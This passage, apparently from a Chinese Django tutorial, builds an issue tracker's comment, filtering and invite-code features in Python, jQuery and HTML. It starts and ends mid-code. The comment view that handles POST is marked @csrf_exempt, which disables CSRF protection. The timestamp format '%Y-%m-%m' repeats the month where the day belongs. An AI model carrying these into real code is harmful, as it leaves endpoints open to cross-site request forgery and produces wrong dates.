class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@csrf_exempt</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">issues_record</span><span class="params">(request, project_id, issues_id)</span>:</span></span><br><span class="line">    <span class="string">""" 初始化操作记录 """</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 判断是否可以评论和是否可以操作这个问题</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">"GET"</span>:</span><br><span class="line">        reply_list = models.IssuesReply.objects.filter(issues_id=issues_id, issues__project=request.tracer.project)</span><br><span class="line">        <span class="comment"># 将queryset类型转为Json类型</span></span><br><span class="line">        data_list = []</span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> reply_list:</span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">'id'</span>: row.id,</span><br><span class="line">                <span class="string">'reply_type_text'</span>: row.get_reply_type_display(),</span><br><span class="line">                <span class="string">'content'</span>: row.content,</span><br><span class="line">                <span class="string">'creator'</span>: row.creator.username,</span><br><span class="line">                <span class="string">'datetime'</span>: row.create_datetime.strftime(<span class="string">'%Y-%m-%m %H:%M'</span>),</span><br><span class="line">                <span class="string">'parent_id'</span>: row.reply_id,</span><br><span class="line">            &#125;</span><br><span class="line">            data_list.append(data)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">'status'</span>: <span class="literal">True</span>, <span class="string">'data'</span>: data_list&#125;)</span><br><span class="line"></span><br><span class="line">   <span class="comment"># 评论 &amp; 回复</span></span><br></pre></td></tr></table></figure><h4 id="12-7-5-评论-amp-回复"><a href="#12-7-5-评论-amp-回复" class="headerlink" title="12.7.5 评论 &amp; 回复"></a>12.7.5 评论 &amp; 回复</h4><ul><li><p>给评论的按钮绑定事件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">点击评论</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bindSubmit</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $(<span class="string">'#btnSubmit'</span>).click(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        $(<span class="string">'#commentText .error-msg'</span>).text(<span class="string">""</span>);</span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">            url: ISSUES_RECORD_URL,</span><br><span class="line">            type: <span class="string">'POST'</span>,</span><br><span class="line">            data: &#123;<span class="attr">content</span>: $(<span class="string">'#content'</span>).val(), <span class="attr">reply</span>: $(<span class="string">'#replyUser'</span>).attr(<span class="string">'parent-id'</span>)&#125;,</span><br><span class="line">            dataType: <span class="string">"JSON"</span>,</span><br><span class="line">            success: <span class="function"><span class="keyword">function</span> (<span class="params">res</span>) </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (res.status) &#123;</span><br><span class="line">                    createRecordNode(res.data);</span><br><span class="line">                    <span class="comment">//输入框清空</span></span><br><span class="line">                    $(<span class="string">'#content'</span>).val(<span class="string">''</span>);</span><br><span class="line">                    $(<span class="string">'#replyUser'</span>).addClass(<span class="string">'hide'</span>).removeAttr(<span class="string">'parent-id'</span>).children(<span class="string">'span'</span>).text(<span class="string">""</span>)</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    $.each(res.error, <span class="function"><span class="keyword">function</span> (<span class="params">key, value</span>) </span>&#123;</span><br><span class="line">                        $(<span class="string">'#content'</span>).next(<span class="string">'.error-msg'</span>).text(value[<span class="number">0</span>])</span><br><span class="line">                    &#125;)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>构造form表单，对评论进行判断</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IssuesReplyModelForm</span><span class="params">(forms.ModelForm)</span>:</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        model = models.IssuesReply</span><br><span class="line">        fields = [<span class="string">'content'</span>,<span class="string">'reply'</span>]</span><br></pre></td></tr></table></figure></li><li><p>后端处理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@csrf_exempt</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">issues_record</span><span class="params">(request, project_id, issues_id)</span>:</span></span><br><span class="line">    <span class="string">""" 初始化操作记录 """</span></span><br><span class="line">    </span><br><span class="line">    ....</span><br><span class="line">    </span><br><span class="line">    form = IssuesReplyModelForm(data=request.POST)</span><br><span class="line">    <span class="keyword">if</span> form.is_valid():</span><br><span class="line">        form.instance.issues_id = issues_id</span><br><span class="line">        form.instance.reply_type = <span class="number">2</span></span><br><span class="line">        form.instance.creator = request.tracer.user</span><br><span class="line">        instance = form.save()</span><br><span class="line">        info = &#123;</span><br><span class="line">            <span class="string">'id'</span>: instance.id,</span><br><span class="line">            <span class="string">'reply_type_text'</span>: instance.get_reply_type_display(),</span><br><span class="line">            <span class="string">'content'</span>: instance.content,</span><br><span class="line">            <span class="string">'creator'</span>: instance.creator.username,</span><br><span class="line">            <span class="string">'datetime'</span>: instance.create_datetime.strftime(<span class="string">'%Y-%m-%m %H:%M'</span>),</span><br><span class="line">            <span class="string">'parent_id'</span>: instance.reply_id,</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">'status'</span>: <span class="literal">True</span>, <span class="string">'data'</span>: info&#125;)</span><br><span class="line">    <span class="keyword">return</span> JsonResponse(&#123;<span class="string">'status'</span>: <span class="literal">False</span>, <span class="string">'error'</span>: form.errors&#125;)</span><br></pre></td></tr></table></figure></li></ul><h3 id="12-8-筛选"><a href="#12-8-筛选" class="headerlink" title="12.8 筛选"></a>12.8 筛选</h3><ul><li>后端接收到前端的url地址，实现筛选</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">issues</span><span class="params">(request, project_id)</span>:</span></span><br><span class="line">    <span class="string">""" 问题列表 """</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">"GET"</span>:</span><br><span class="line">        ...</span><br><span class="line">        <span class="comment"># 根据URL做筛选</span></span><br><span class="line">        allow_filter_name = [<span class="string">'issues_type'</span>, <span class="string">'status'</span>, <span class="string">'priority'</span>, <span class="string">'assign'</span>,<span class="string">'attention'</span>]</span><br><span class="line">        <span class="comment"># 筛选条件(根据用户通过GET传参实现)</span></span><br><span class="line">        <span class="comment"># ?status=1&amp;status=2&amp;issues_type=1</span></span><br><span class="line">        condition = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> name <span class="keyword">in</span> allow_filter_name:</span><br><span class="line">            value_list = request.GET.getlist(name)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> value_list:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            condition[<span class="string">"&#123;&#125;__in"</span>.format(name)] = value_list</span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        condition = &#123;</span></span><br><span class="line"><span class="string">            "status__in":[1,2],</span></span><br><span class="line"><span class="string">            "issues_type":[1,]</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 分页获取数据</span></span><br><span class="line">        ....</span><br></pre></td></tr></table></figure><ul><li>前端代码，ForeignKey应用了select2组件进行短多选。</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">select2组件应用的css代码</span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"&#123;% static 'plugin/select2/css/select2.min.css' %&#125;"</span>&gt;</span></span><br><span class="line">....</span><br><span class="line"><span class="comment">&lt;!--  筛选的相关代码  --&gt;</span></span><br><span class="line">&#123;% for row in filter_list %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"item"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"title"</span>&gt;</span>&#123;&#123; row.title &#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"check-list"</span>&gt;</span></span><br><span class="line">        &#123;% for item in row.filter %&#125;</span><br><span class="line">        &#123;&#123; item &#125;&#125;</span><br><span class="line">        &#123;% endfor %&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">js代码</span><br><span class="line"></span><br><span class="line">select2组件应用的js代码</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"&#123;% static 'plugin/select2/js/select2.min.js' %&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"&#123;% static 'plugin/select2/js/i18n/zh-CN.js' %&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    $(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line">        bindClickCheckFilter();</span><br><span class="line">        initSelect2();</span><br><span class="line">    &#125;);</span><br><span class="line">    /*</span><br><span class="line">    点击筛选checkbox</span><br><span class="line">     */</span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">bindClickCheckFilter</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">        $(<span class="string">'.filter-area'</span>).find(<span class="string">':checkbox'</span>).click(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            location.href = $(<span class="keyword">this</span>).parent().attr(<span class="string">'href'</span>);</span></span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    /*</span><br><span class="line">    select2组件</span><br><span class="line">    */</span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">initSelect2</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">        $(<span class="string">'.select2'</span>).select2(&#123;&#125;).on(<span class="string">'select2:select'</span>,<span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span></span><br><span class="line"><span class="actionscript">            <span class="comment">// 选择某一项触发</span></span></span><br><span class="line">            location.href = e.params.data.id</span><br><span class="line"><span class="actionscript">        &#125;).on(<span class="string">'select2:unselect'</span>,<span class="function"><span class="keyword">function</span> <span class="params">(e)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">            <span class="comment">// 移除某一项触发</span></span></span><br><span class="line">            location.href = e.params.data.id</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="12-9-邀请对象"><a href="#12-9-邀请对象" class="headerlink" title="12.9 邀请对象"></a>12.9 邀请对象</h3><h4 id="12-9-1-表结构设置"><a href="#12-9-1-表结构设置" class="headerlink" title="12.9.1 表结构设置"></a>12.9.1 表结构设置</h4><table><thead><tr><th>ID</th><th>有效期</th><th>数量</th><th>使用数量</th><th>创建者</th><th>邀请码</th><th>项目</th></tr></thead><tbody><tr><td>1</td><td>24</td><td></td><td></td><td>4</td><td>xxxx</td><td>1</td></tr><tr><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProjectInvite</span><span class="params">(models.Model)</span>:</span></span><br><span class="line">    <span class="string">"""项目邀请码"""</span></span><br><span class="line">    project = models.ForeignKey(verbose_name=<span class="string">"项目"</span>,to=<span class="string">"Project"</span>)</span><br><span class="line">    code = models.CharField(verbose_name=<span class="string">"邀请码"</span>,max_length=<span class="number">64</span>,unique=<span class="literal">True</span>)</span><br><span class="line">    count = models.PositiveIntegerField(verbose_name=<span class="string">"限制数量"</span>,null=<span class="literal">True</span>,blank=<span class="literal">True</span>,help_text=<span class="string">"空表示无数量限制"</span>)</span><br><span class="line">    use_count = models.PositiveIntegerField(verbose_name=<span class="string">'已邀请数量'</span>,default=<span class="number">0</span>)</span><br><span class="line">    period_choices = (</span><br><span class="line">    (<span class="number">30</span>,<span class="string">'30分钟'</span>),</span><br><span class="line">    (<span class="number">60</span>,<span class="string">'1小时'</span>),</span><br><span class="line">        (<span class="number">300</span>,<span class="string">'5小时'</span>),</span><br><span class="line">        (<span class="number">1440</span>,<span class="string">'24小时'</span>),</span><br><span class="line">    )</span><br><span class="line">    period = models.IntegerField(verbose_name=<span class="string">"有效期"</span>,choices=period_choices,default=<span class="number">1440</span>)</span><br><span class="line">    create_datetime = models.DateTimeField(verbose_name=<span class="string">"创建时间"</span>,auto_now_add=<span class="literal">True</span>)</span><br><span class="line">    creator = models.ForeignKey(verbose_name=<span class="string">"创建者"</span>,to=<span class="string">"UserInfo"</span>,related_name=<span class="string">'create_invite'</span>)</span><br></pre></td></tr></table></figure><h4 id="12-9-2-邀请成员模态框"><a href="#12-9-2-邀请成员模态框" class="headerlink" title="12.9.2 邀请成员模态框"></a>12.9.2 邀请成员模态框</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 邀请成员的模态框代码 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal fade"</span> <span class="attr">id</span>=<span class="string">"inviteModal"</span> <span class="attr">tabindex</span>=<span class="string">"-1"</span> <span class="attr">role</span>=<span class="string">"dialog"</span> <span class="attr">aria-labelledby</span>=<span class="string">"myModalLabel"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-dialog"</span> <span class="attr">role</span>=<span class="string">"document"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-content"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-header"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"close"</span> <span class="attr">data-dismiss</span>=<span class="string">"modal"</span> <span class="attr">aria-label</span>=<span class="string">"Close"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span></span></span><br><span class="line"><span class="tag">                                                                                                  <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="symbol">&amp;times;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">h4</span> <span class="attr">class</span>=<span class="string">"modal-title"</span> <span class="attr">id</span>=<span class="string">"myModalLabel"</span>&gt;</span>邀请成员<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-body"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">"inviteForm"</span>&gt;</span></span><br><span class="line">                    &#123;% csrf_token %&#125;</span><br><span class="line">                    &#123;% for item in invite_form %&#125;</span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"&#123;&#123; item.id_for_label &#125;&#125;"</span>&gt;</span>&#123;&#123; item.label &#125;&#125;<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;% if item.help_text %&#125;(&#123;&#123; item.help_text &#125;&#125;)&#123;% endif %&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                        &#123;&#123; item &#125;&#125;</span><br><span class="line">                        <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"error-msg"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    &#123;% endfor %&#125;</span><br><span class="line">                    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"btn btn-success"</span> <span class="attr">id</span>=<span class="string">"btnGenInviteCode"</span>&gt;</span>生成邀请码<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"inviteArea"</span> <span class="attr">class</span>=<span class="string">"hide"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">hr</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"input-group"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"input-group-btn"</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"邀请链接"</span> <span class="attr">class</span>=<span class="string">"btn btn-default"</span> <span class="attr">style</span>=<span class="string">"margin-left: 15px"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">id</span>=<span class="string">"inviteUrl"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"input-group-btn"</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"复制链接"</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span> <span class="attr">id</span>=<span class="string">"btnCopyUrl"</span> <span class="attr">style</span>=<span class="string">"margin-right: 15px"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">相关的js代码</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    $(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line">        bindCreateInviteCode();</span><br><span class="line">        bindCopyUrl();</span><br><span class="line">    &#125;);</span><br><span class="line">    /*</span><br><span class="line">    复制邀请码</span><br><span class="line">    */</span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">bindCopyUrl</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">        $(<span class="string">'#btnCopyUrl'</span>).click(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> textInput = $(<span class="string">'#inviteUrl'</span>)[<span class="number">0</span>]; <span class="comment">// 找到inviteUrl框</span></span></span><br><span class="line"><span class="actionscript">            textInput.select();     <span class="comment">// 选中框里面的内容</span></span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.execCommand(<span class="string">"Copy"</span>);   <span class="comment">// 进行复制</span></span></span><br><span class="line"><span class="actionscript">            alert(<span class="string">'复制成功'</span>)</span></span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="12-9-3-生成邀请码"><a href="#12-9-3-生成邀请码" class="headerlink" title="12.9.3 生成邀请码"></a>12.9.3 生成邀请码</h4><ul><li><p>构造生成邀请码的url地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 项目管理</span></span><br><span class="line">url(<span class="string">r'^manage/(?P&lt;project_id&gt;\d+)/'</span>, include([</span><br><span class="line">    <span class="comment"># 问题管理</span></span><br><span class="line">...</span><br><span class="line">    <span class="comment"># 编辑问题</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="comment"># 问题更新</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="comment"># 问题讨论</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="comment"># 生成邀请码</span></span><br><span class="line">    url(<span class="string">r'^issues/inviter/url/$'</span>, issues.inviter_url, name=<span class="string">'inviter_url'</span>),</span><br><span class="line">], <span class="literal">None</span>, <span class="literal">None</span>)),</span><br></pre></td></tr></table></figure></li><li><p>form表单</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">InviteModelForm</span><span class="params">(BootSrtapForm,forms.ModelForm)</span>:</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        model = models.ProjectInvite</span><br><span class="line">        fields = [<span class="string">'period'</span>,<span class="string">'count'</span>]</span><br></pre></td></tr></table></figure></li><li><p>后端生成邀请码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inviter_url</span><span class="params">(request, project_id)</span>:</span></span><br><span class="line">    <span class="string">"""生成邀请码"""</span></span><br><span class="line">    form = InviteModelForm(request.POST)</span><br><span class="line">    <span class="keyword">if</span> form.is_valid():</span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        1.创建随机验证码</span></span><br><span class="line"><span class="string">        2.验证码保存到数据库</span></span><br><span class="line"><span class="string">        3.限制：只有创建者才能邀请</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> request.tracer.user != request.tracer.project.creator:</span><br><span class="line">            form.add_error(<span class="string">'period'</span>,<span class="string">'无权创建邀请码'</span>)</span><br><span class="line">            <span class="keyword">return</span> 